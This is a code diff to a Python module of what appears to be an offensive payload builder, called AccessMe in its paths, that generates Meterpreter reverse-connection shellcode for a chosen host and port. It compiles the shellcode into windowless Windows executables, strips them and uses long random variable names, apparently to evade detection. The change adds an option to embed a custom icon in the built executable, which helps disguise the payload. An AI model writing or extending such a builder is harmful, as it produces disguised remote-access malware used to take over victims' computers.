@@ -1,8 +1,7 @@
 #Import
 from lib import core
-import random, string, binascii
-import subprocess
-import time
+import random, string
+import subprocess, os
 
 
 
@@ -23,9 +22,7 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
 
     while Gen_Payload:
 
-        #x64 PART
         if ("x64") in ARCH:
-
             if ("HTTP") in PROTOCOLE:
                 if ("Meterpreter") in TYPE:
 
@@ -38,7 +35,6 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     return SHELLCODE
 
 
-
             elif ("HTTPS") in PROTOCOLE:
                 if ("Meterpreter") in TYPE:
 
@@ -49,7 +45,6 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
 
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
                     return SHELLCODE
-
 
 
             elif ("TCP") in PROTOCOLE:
@@ -65,9 +60,7 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
 
 
 
-        #X86 PART
         elif ("x86") in ARCH:
-
             if ("HTTP") in PROTOCOLE:
                 if ("Meterpreter") in TYPE:
 
@@ -80,7 +73,6 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     return SHELLCODE
 
 
-
             elif ("HTTPS") in PROTOCOLE:
                 if ("Meterpreter") in TYPE:
 
@@ -91,7 +83,6 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
 
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
                     return SHELLCODE
-
 
 
             elif ("TCP") in PROTOCOLE:
@@ -107,44 +98,107 @@ def Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
 
 
 
-#Auto-Compilation
-def Auto_Compiler(FILENAME, ARCH, PLATFORM):
+#Add icon in executable
+def Add_Icon():
+    print("""
+ |------------------------------------------------------------|
+ |In the "icon" folder, put your icon files in it.            |
+ |To specify an icon file, write as follows: my_icon_name.ico |
+ |Press "ENTER" if you do not have an icon.                   |
+ |------------------------------------------------------------|
+        \n""")
+    ICON = core.core_input()
+    return ICON
+
+
+
+#Auto-Compilation with ICON or no
+def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):
 
     Compiler = True
 
     while Compiler:
-        
-        #x64 PART
+
         if ("64") in ARCH:
             if ("Windows") in PLATFORM:
+                if ICON != "":
 
-                EXE = ['x86_64-w64-mingw32-gcc', 'source.c', '-o', FILENAME, '-mwindows']
-                subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                    RC = 'id ICON "/root/AccessMe/icon/'
+                    RC += ''.join((ICON, '"'))
+                    with open('/root/AccessMe/icon/AccessMe.rc', 'w') as f:
+                        f.write(RC)
 
-                RM_SourceFile = ['rm', '/root/AccessMe/source.c']
-                subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                    WINDRES = ['windres', '/root/AccessMe/icon/AccessMe.rc', '-O', 'coff', '-o', '/root/AccessMe/icon/AccessMe.res']
+                    subprocess.run(WINDRES, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                print("\nCompilation completed !\n")
+                    EXE = ['x86_64-w64-mingw32-gcc', 'source.c', '/root/AccessMe/icon/AccessMe.res', '-o', FILENAME,'-mwindows']
+                    subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                Compiler = False
+                    RM_SourceFile = ['rm', '/root/AccessMe/source.c']
+                    subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    RM_RcFile = ['rm', '/root/AccessMe/icon/AccessMe.rc']
+                    subprocess.run(RM_RcFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    RM_ResFile = ['rm', '/root/AccessMe/icon/AccessMe.res']
+                    subprocess.run(RM_ResFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    print("Compilation completed !")
+
+                    Compiler = False
 
 
-        #86 PART
+                else:
+
+                    EXE = ['x86_64-w64-mingw32-gcc', 'source.c', '-o', FILENAME, '-mwindows']
+                    subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    print("Compilation completed !")
+
+                    Compiler = False
+
+
         elif ("x86") in ARCH:
             if ("Windows") in PLATFORM:
+                if ICON != "":
 
-                EXE = ['i686-w64-mingw32-gcc', 'source.c', '-o',  FILENAME, '-mwindows']
-                subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                    RC = 'id ICON "/root/AccessMe/icon/'
+                    RC += ''.join((ICON, '"'))
+                    with open('/root/AccessMe/icon/AccessMe.rc', 'w') as f:
+                        f.write(RC)
 
-                RM_SourceFile = ['rm', '/root/AccessMe/source.c']
-                subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                    WINDRES = ['windres_1', '/root/AccessMe/icon/AccessMe.rc', '-O', 'coff', '-o','/root/AccessMe/icon/AccessMe.res']
+                    subprocess.run(WINDRES, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                print("\nCompilation completed !\n")
+                    EXE = ['i686-w64-mingw32-gcc', 'source.c', '/root/AccessMe/icon/AccessMe.res', '-o', FILENAME,'-mwindows']
+                    subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                Compiler = False
+                    RM_RcFile = ['rm', '/root/AccessMe/icon/AccessMe.rc']
+                    subprocess.run(RM_RcFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    RM_ResFile = ['rm', '/root/AccessMe/icon/AccessMe.res']
+                    subprocess.run(RM_ResFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    print("Compilation completed !")
+
+                    Compiler = False
+
+
+                else:
+
+                    EXE = ['i686-w64-mingw32-gcc', 'source.c', '-o', FILENAME, '-mwindows']
+                    subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    RM_SourceFile = ['rm', '/root/AccessMe/source.c']
+                    subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                    print("Compilation completed !")
+
+                    Compiler = False
 
 
 
+#Auto-Strip
 def Auto_Executable_Strip(FILENAME, PLATFORM):
 
     Stripper = True
@@ -156,9 +210,9 @@ def Auto_Executable_Strip(FILENAME, PLATFORM):
             EXE_STRIP = ['strip', '-s', FILENAME]
             subprocess.run(EXE_STRIP, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-            print("\nStrip completed !\n")
+            print("Strip completed !\n")
 
-        Stripper = False
+            Stripper = False
 
 
 
@@ -186,9 +240,9 @@ def FILENAME_Input():
 
 
 #Varname creator ^^
-def varname_creator():
-    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + "_") for _ in range(random.randint(167,489)))
-    return varname
+def Varname_Creator():
+    Varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + "_") for _ in range(random.randint(167,489)))
+    return Varname
 
 
 
